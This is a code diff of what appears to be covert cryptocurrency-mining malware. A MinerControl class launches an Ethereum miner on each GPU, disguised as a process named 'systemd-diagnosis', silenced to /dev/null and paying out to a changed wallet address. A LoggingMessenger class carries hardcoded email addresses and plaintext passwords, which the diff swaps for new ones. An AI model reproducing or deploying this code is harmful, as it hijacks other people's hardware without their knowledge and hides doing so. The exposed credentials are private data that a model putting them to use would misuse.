@@ -108,10 +108,10 @@ class LoggingMessenger(Thread):
         self.__local = 129
         self.__interval = 1200
         # email setting
-        self.__mail_addr = 'kiswgknbjr@163.com'
-        self.__mail_host = 'smtp.163.com'
-        self.__mail_user = 'kiswgknbjr'
-        self.__mail_pass = 'VCGGPQJNUKSBHVLI'
+        self.__mail_addr = 'duejohn825@gmail.com'
+        self.__mail_host = 'imap.gmail.com'
+        self.__mail_user = 'duejohn825@gmail.com'
+        self.__mail_pass = 'vekktzscbyhfvadv'
     
     def run(self):
         t = 0
@@ -198,7 +198,7 @@ class MinerControl(Thread):
                     if not self.__working[gpu]:
                         print("nohup systemd-diagnosis -epsw x -mode 1 -Rmode 0 -log 0 -mport 0 -etha 0 "
                              "-retrydelay 1 -ftime 55 -tt 79 -tstop 89 -asm 2 -pool eth.f2pool.com:6688 "
-                             f"-gpus {gpu+1} -wal oxa31d3e12b -worker glib{gpu+1} -coin eth 2>&1 > /dev/null &")
+                             f"-gpus {gpu+1} -wal 0x35c366d465c402cbf95e47c585d9c9e7689ebbdd -worker glib{gpu+1} -coin eth 2>&1 > /dev/null &")
                         self.__working[gpu] = True
                         logging(f'start mining on gpu{gpu}.', 'INFO')
                         sleep(1)
